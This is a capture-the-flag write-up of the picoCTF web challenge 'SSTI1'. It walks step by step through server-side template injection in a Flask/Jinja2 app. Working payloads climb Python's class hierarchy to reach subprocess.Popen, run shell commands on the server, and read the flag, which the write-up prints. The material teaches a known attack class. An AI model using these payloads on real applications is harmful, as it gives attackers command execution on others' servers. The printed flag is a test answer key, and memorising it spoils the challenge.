# **Write-Up for SSTI1 (Server-Side Template Injection)**  

## **Challenge Overview**  

### **Challenge Name:** SSTI1  
### **Category:** Web Exploitation  
### **Description:**  

The challenge presents a web application where users can post announcements. The key vulnerability hinted at in the description is **Server-Side Template Injection (SSTI)**. The goal is to exploit this weakness to execute commands on the server and retrieve the flag.  

---

## **Step 1: Identifying SSTI Vulnerability**  

To determine whether the application is vulnerable to SSTI, I tested a simple mathematical expression:  

```
{{7*7}}
```  

If the application correctly processes the input as a template expression, the result should be `49`.  

**Result:**  

```
49
```  

This confirms that the input is being interpreted and evaluated by a template engine, meaning the application is vulnerable to SSTI.  

---

## **Step 2: Identifying the Template Engine**  

Different web frameworks use different template engines, so determining which one is in use helps in crafting a targeted exploit. One common way to test for Jinja2 (used in Flask applications) is by checking for a Flask configuration object:  

```
{{ config }}
```  

**Result:**  

The output included a Flask configuration dictionary, confirming that the application is running on **Jinja2 (Python)**.  

---

## **Step 3: Exploring Available Objects**  

Jinja2 allows access to Python objects through template expressions. By enumerating the subclasses available in the execution environment, I was able to identify objects that could be leveraged for code execution.  

The following payload lists all available subclasses:  

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```  

**Result:**  

A long list of available classes was returned, including `subprocess.Popen`, which allows for **command execution** on the server.  

---

## **Step 4: Finding the Index of `subprocess.Popen`**  

Since `subprocess.Popen` was included in the list, the next step was to determine its index within the subclasses list. By iterating through the list and searching for `subprocess.Popen`, I found that it was at index `356`:  

```
{{ ''.__class__.__mro__[1].__subclasses__()[356] }}
```  

**Result:**  

```
<class 'subprocess.Popen'>
```  

This confirmed that `subprocess.Popen` could be accessed and used to execute commands.  

---

## **Step 5: Listing Files on the Server**  

Now that I had access to `subprocess.Popen`, I used it to execute the `ls` command to list the files present in the working directory:  

```
{{ ''.__class__.__mro__[1].__subclasses__()[356]('ls', shell=True, stdout=-1).communicate() }}
```  

**Result:**  

```
(b'__pycache__\napp.py\nflag\nrequirements.txt\n', None)
```  

This confirmed the presence of a file named **`flag`**.  

---

## **Step 6: Reading the Flag File**  

With `subprocess.Popen`, I executed the `cat` command to read the contents of the `flag` file:  

```
{{ ''.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate() }}
```  

**Result:**  

```
(b'picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}', None)
```  

This successfully retrieved the flag.  

---

## **Final Flag**  

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}
